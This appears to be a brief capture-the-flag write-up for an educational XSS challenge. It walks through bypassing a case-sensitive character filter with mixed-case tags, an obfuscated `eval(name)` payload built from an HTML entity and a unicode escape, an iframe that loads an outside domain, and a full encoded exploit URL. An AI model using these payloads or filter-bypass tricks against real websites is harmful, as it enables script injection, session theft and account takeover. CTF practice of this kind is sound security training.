# How 2 xss solve step by step

## Step 1
`<svg/onload=alert(123)>` // Not Work since it replace the repeated characters case-sensitively
`<svg/OnLoad=Alert(123)>` // Work since it replace the repeated characters case-sensitively

## Step 2
Ok to xss but we want to execute our command. 
Yet it still has a problem that the character will be deprecated like before
So we use, where &#97 is the HTML entity of a and \u{65} is the unicode of e
`<SVG/ONLoAd=eval(n&#97;m\u{65})>` now makes xss seems work.


`<ifRame src=/\QVXZ.ML>` Dont forget to change iframe to ifRame since r and r are case-sensitively identical.
https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG%2FONLoAD%3Deval%28n%26%2397%3Bm%5Cu%7B65%7D%29%3E